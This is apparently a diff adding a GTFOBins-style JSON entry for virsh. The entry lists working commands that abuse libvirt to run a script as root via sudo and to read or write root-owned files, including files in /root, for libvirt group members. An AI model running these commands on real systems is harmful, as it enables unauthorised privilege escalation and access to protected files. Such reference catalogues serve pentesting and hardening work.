@@ -1,0 +1,21 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='[script]'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "This requires the user to be in the 'libvirt' group to perform privileged file write. If the target directory doesn't exist, 'pool-create-as' must be run with the '--build' option. The destination file ownership and permissions can be set in the XML.",
+        "code": "echo '[data]' > [data_to_write]\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>[dir]/[file]</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>[dir]/[file]</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target [dir]\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x [dir]/[file] [data_to_write]\nvirsh -c qemu:///system pool-destroy x\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "This requires the user to be in the 'libvirt' group to perform privileged file read.",
+        "code": "virsh -c qemu:///system pool-create-as x dir --target /root\nvirsh -c qemu:///system vol-download --pool x [file] [file_to_save]\nvirsh -c qemu:///system pool-destroy x\n"
+      }
+    ]
+  }
+}
